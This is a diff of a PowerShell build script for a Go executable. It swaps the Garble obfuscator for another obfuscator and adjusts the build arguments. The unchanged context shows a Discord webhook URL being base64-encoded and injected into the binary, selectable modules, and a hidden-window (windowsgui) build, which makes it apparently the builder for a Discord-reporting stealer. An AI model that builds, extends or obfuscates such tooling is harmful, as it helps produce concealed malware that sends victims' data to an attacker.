@@ -77,10 +77,7 @@ Start-Process -FilePath go -ArgumentList "mod", "tidy" -NoNewWindow -Wait
 Write-Host "Go modules updated."
 Write-Host ""
 
-Write-Host "Installing Garble... This tool is used to obfuscate the Go binary."
-Start-Process -FilePath go -ArgumentList "install", "mvdan.cc/garble@latest" -NoNewWindow -Wait
-Write-Host "Garble has been installed."
-Write-Host ""
+Start-Process -FilePath go -ArgumentList "install", "github.com/CuteTenshii/go-obfuscator@latest" -NoNewWindow -Wait
 
 # Prompt for filename
 $filename = Read-Host "Enter the output filename (without extension)"
@@ -184,13 +181,12 @@ Write-Host "Building your executable... This may be fast or take a while dependi
 $encodedWebhook = Encode-Base64 -plainText $discordWebhook
 $ldflags = "-X \`"main.modulesEnabled=$goTags\`" -X \`"main.discordWebhookUrl=$encodedWebhook\`" -s -w -H=windowsgui"
 $buildArgs = @(
-    "build"
+    "-input", "."
     "-trimpath"
     "-ldflags", "`"$ldflags`""
     "-o", $output
-    "."
 )
-$build = Start-Process -FilePath garble -ArgumentList $buildArgs -NoNewWindow -Wait -PassThru
+$build = Start-Process -FilePath go-obfuscator -ArgumentList $buildArgs -NoNewWindow -Wait -PassThru
 
 if ($build.ExitCode -ne 0)
 {
